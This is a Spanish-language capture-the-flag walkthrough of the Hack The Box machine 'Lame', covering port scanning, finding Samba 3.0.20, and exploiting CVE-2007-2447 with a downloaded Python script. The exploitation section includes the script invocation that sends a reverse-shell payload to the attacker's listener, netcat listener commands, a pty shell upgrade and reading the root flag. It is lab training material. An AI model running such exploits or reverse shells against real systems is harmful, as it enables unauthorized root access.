
<p align="center">
<img src="https://miro.medium.com/v2/resize:fit:587/1*wKEVaRX8VaMjioP87jbj3A.png">
</p>

Lame es una máquina en Linux de dificultad fácil en la cual se va a utilizar un script en python para explotar una vulnerabilidad en SMB (CVE-2007-2447) sin usar **Metasploit**.


## Reconocimiento y Enumeración

### Ping

En primer lugar se debe revisar que la máquina esté activa. Hacemos un ping usando el siguiente comando:
`ping -c 1 10.10.10.3`
- `-c <n>` = realizar *n* veces el ping

### Nmap

Se procede a realizar un escaneo de todos los puertos usando la herramienta **nmap** con el siguiente comando:
`nmap -p- --open -T5 -v -n 10.10.10.175 -oG all-ports`

- `-p-:` escanea todos los 65536 puertos
- `--open:` solo se va a tener en cuenta los puertos abiertos
- `-T5:` establece la plantilla de temporización, el rango es entre 0-5 y por lo tanto, el escaneo va a ir a una mayor velocidad
- `-v:` cuando nmap descubre un puerto, lo imprime por consola
- `-n:` se desactiva la resolución de DNS
- `-oG:` el archivo se va a guardar en formato grepable 

El output de **nmap** es el siguiente:

```console
root@kali:/home/kali# nmap -p- --open -T5 -v -n 10.10.10.3 -oG all-ports 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 12:23 EDT
Initiating Ping Scan at 12:23
Scanning 10.10.10.3 [4 ports]
Completed Ping Scan at 12:23, 1.47s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:23
Scanning 10.10.10.3 [65535 ports]
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.18s latency).
Not shown: 65530 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

Una vez se sabe qué puertos están abiertos en la máquina objetivo se procede a revisar las versiones de los servicios usando el comando:
`nmap -sC -sV -p21,22,139.445,3632 10.10.10.3 -oN targeted.txt`

- `-sC:`  realiza un escaneo usando los scripts por defecto que se encuentran en la base de datos de **nmap**
- `-sV:` intenta encontrar la versión del servicio que está corriendo en el puerto correspondiente
- `-p:` se establece los puertos que deseo hacer el escaneo
- `oN:` el archivo se va a guardar en un formato normal, en este caso en formato de texto

El output de **nmap** es el siguiente:

```console
root@kali:/home/kali# nmap -sC -sV -p21,22,139,445,3632 10.10.10.3 -oN targeted.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-19 12:30 EDT
Nmap scan report for 10.10.10.3
Host is up (0.18s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.33
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3d00h56m02s, deviation: 2h49m44s, median: -3d02h56m04s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-03-16T09:35:18-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

Los puertos que están abiertos corresponde a los siguientes servicios:

- `Puerto 21 (FTP File Transfer Protocol):` se utiliza para conectarse de forma  remota a un servidor y autenticarse en él.
- `Puerto 22 (SSH Secure Shell):` sirve para acceder de manera remota a máquinas. SSH da una capa extra de seguridad usando mecanismo de cifrado y técnicas de criptografía que garantizan que las comunicaciones desde y hacia el servidor remoto sean cifradas.
- `Puerto 139 (NetBios):` es una capa de transporte antigua que permite que los computadores con Windows se comuniquen entre sí dentro de la misma red.
- `Puerto 445 (SMB):` permite compartir archivos a través de una red TCP/IP Windows.

Procedemos a buscar la versión de **Samba** que se acabó de encontrar para saber si es vulnerable a un ataque ya conocido. Para esto, usamos el siguiente comando:
`searchploit samba`

```console
root@kali:/home/kali# searchsploit samba
----------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                               |  Path
                                                                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                         | exploits/osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                       | exploits/multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                             | exploits/unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                           | exploits/linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                       | exploits/linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                     | exploits/solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                                     | exploits/linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                            | exploits/multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                                             | exploits/linux/remote/364.pl
Samba 3.3.12 (Linux x86) - 'chain_reply' Memory Corruption (Metasploit)                                                      | exploits/linux_x86/remote/16860.rb
Samba 3.3.5 - Format String / Security Bypass                                                                                | exploits/linux/remote/33053.txt
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overflow (Metasploit)                                  | exploits/linux/remote/21850.rb

```

Como se  puede observar, es vulnerable a `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution`. La idea es evitar el uso de **Metasploit** que es una framework para realizar pruebas de pentesting de manera automatizada para familiarizarnos y entender  el comportamiento de los scripts que explotan las vulnerabilidades.

Se busca información sobre `samba usermap script` y encontramos el siguiente [artículo](https://amriunix.com/post/cve-2007-2447-samba-usermap-script/) que nos descibe la **CVE** (Common Vulnerabilities and Exposures) correspondiente. 

En este punto se procede a descargar un script escrito en **Python** para realizar la explotación [enlace](https://github.com/amriunix/CVE-2007-2447) 


## Explotación

Antes de ejecutar el script previamente descargado, se procede a crear una sesión con **netcat** que es una herramienta de red nos permite ponernos en modo escucha en un puerto seleccionado tanto en TCP como UDP. El comando a ejecutar es el siguiente:
`nc -lvp 4444`

- `-l:` activa el modo escucha
- `-v:` informa el estado de la sesión
- `-p:` permite especificar el puerto local que se va a utilizar

Ahora se procede a ejecutar el exploit descargado anteriormente usando el siguiente comando:
`python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>`

- `<RHOST>:` la dirección IP de la máquina Lame (10.10.10.3)
- `<RPORT>:` el puerto de la máquina Lame (TCP 139)
- `<LHOST>:` la dirección IP de la máquina local
- `<LPORT>:` el puerto que se haya establecido en netcat (TCP 4444)

```console
root@kali:/home/kali/Documents/HTB/Machines/Lame/exploits/CVE-2007-2447# python usermap_script.py 10.10.10.3 139 10.10.14.11 4444
[*] CVE-2007-2447 - Samba usermap script
[+] Connecting !
[+] Payload was sent - check netcat !
```

En este instante ya se está dentro de la máquina como *root*, lo que queda por hacer es ir a los directorios donde se encuentran las flags del *usuario* y del *root*.

```console
root@kali:/home/kali# rlwarp -nlvp 4444
bash: rlwarp: command not found
root@kali:/home/kali# rlwrap -nlvp 4444
rlwrap: error: Cannot execute 4444: No such file or directory
root@kali:/home/kali# rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.3] 51795

whoami
root
```

El siguiente comando permite tener una shell interactiva:
```python
python -c 'import pty; pty.spawn("/bin/sh")'
```

```console
sh-3.2# ls
ls
bin    dev   initrd      lost+found  nohup.out  root  sys  var
boot   etc   initrd.img  media       opt        sbin  tmp  vmlinuz
cdrom  home  lib         mnt         proc       srv   usr
```

La flag de root se encuentra en el directorio *root*

```console
sh-3.2# cd root
cd root
sh-3.2# ls
ls
Desktop  reset_logs.sh  root.txt  vnc.log
sh-3.2# cat root.txt
cat root.txt
92caac..........................
```

La flag del usuario se encuentra en *home/makis*

```console
sh-3.2# cd /home/makis
cd /home/makis
sh-3.2# cat user.txt
cat user.txt
69454a..........................
```

